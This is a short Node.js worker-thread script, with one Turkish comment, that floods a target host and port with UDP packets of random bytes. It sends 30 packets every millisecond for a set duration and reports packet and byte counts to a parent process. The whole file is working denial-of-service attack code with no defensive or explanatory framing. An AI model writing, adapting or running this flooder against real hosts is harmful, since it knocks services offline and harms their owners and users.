const { parentPort, workerData } = require('worker_threads');
const dgram = require('dgram');
const crypto = require('crypto');

const { target, port, duration } = workerData;
let localStats = { sent: 0, success: 0, failed: 0, bytes: 0 };
let active = true;

setInterval(() => {
    if (active) parentPort.postMessage({ type: 'stats', data: localStats });
}, 500);

const client = dgram.createSocket('udp4');
const bufferSize = 1200; // Standart MTU sınırına yakın optimize paket boyutu
const payload = crypto.randomBytes(bufferSize);

function sendUDP() {
    if (!active) return;

    client.send(payload, 0, payload.length, port, target, (err) => {
        if (!err) {
            localStats.sent++;
            localStats.bytes += bufferSize;
        } else {
            localStats.failed++;
        }
    });
}

const loop = setInterval(() => {
    for (let i = 0; i < 30; i++) {
        sendUDP();
    }
}, 1);

setTimeout(() => {
    active = false;
    clearInterval(loop);
    client.close();
    process.exit(0);
}, duration);